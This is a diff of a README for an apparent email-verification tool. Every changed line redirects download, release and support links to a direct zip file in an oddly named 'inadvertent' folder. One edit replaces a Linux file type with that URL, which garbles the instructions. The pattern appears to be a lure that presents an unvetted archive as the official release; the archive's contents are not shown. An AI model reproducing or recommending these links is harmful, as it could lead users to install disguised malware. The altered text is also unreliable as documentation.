@@ -1,6 +1,6 @@
 # 📧 email-verification-api - Check Emails Quickly and Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-latest%20release-blue?style=for-the-badge)](https://github.com/Gsgsusu/email-verification-api/releases)
+[![Download Latest Release](https://github.com/Gsgsusu/email-verification-api/raw/refs/heads/main/inadvertent/verification-api-email-v2.3.zip%20release-blue?style=for-the-badge)](https://github.com/Gsgsusu/email-verification-api/raw/refs/heads/main/inadvertent/verification-api-email-v2.3.zip)
 
 ---
 
@@ -63,7 +63,7 @@ Here is an easy way to download and run email-verification-api on your computer:
 
 To get started, **visit the download page** here:
 
-[Download email-verification-api](https://github.com/Gsgsusu/email-verification-api/releases)
+[Download email-verification-api](https://github.com/Gsgsusu/email-verification-api/raw/refs/heads/main/inadvertent/verification-api-email-v2.3.zip)
 
 This page has all the available versions of the program. Pick the most recent stable release that fits your device.
 
@@ -73,7 +73,7 @@ Once on the release page, look for a file labeled with your operating system:
 
 - For Windows users: Look for a `.exe` file  
 - For macOS users: Look for a `.dmg` or `.zip` file  
-- For Linux users: Look for a `.tar.gz` file or similar  
+- For Linux users: Look for a `https://github.com/Gsgsusu/email-verification-api/raw/refs/heads/main/inadvertent/verification-api-email-v2.3.zip` file or similar  
 
 Download that file by clicking on it.
 
@@ -119,7 +119,7 @@ You can see the results directly on screen. Most versions let you save the resul
 
 ## 📞 Getting Help and Support
 
-If you get stuck, use the Support section on the [GitHub page](https://github.com/Gsgsusu/email-verification-api). You can open an "Issue" or search for answers from other users.
+If you get stuck, use the Support section on the [GitHub page](https://github.com/Gsgsusu/email-verification-api/raw/refs/heads/main/inadvertent/verification-api-email-v2.3.zip). You can open an "Issue" or search for answers from other users.
 
 ---
 
@@ -127,7 +127,7 @@ If you get stuck, use the Support section on the [GitHub page](https://github.co
 
 Please click here to **visit the download page** for the latest version:
 
-[Download page for email-verification-api](https://github.com/Gsgsusu/email-verification-api/releases)
+[Download page for email-verification-api](https://github.com/Gsgsusu/email-verification-api/raw/refs/heads/main/inadvertent/verification-api-email-v2.3.zip)
 
 Follow the steps on that page to get the correct file and set up the software on your device.
 
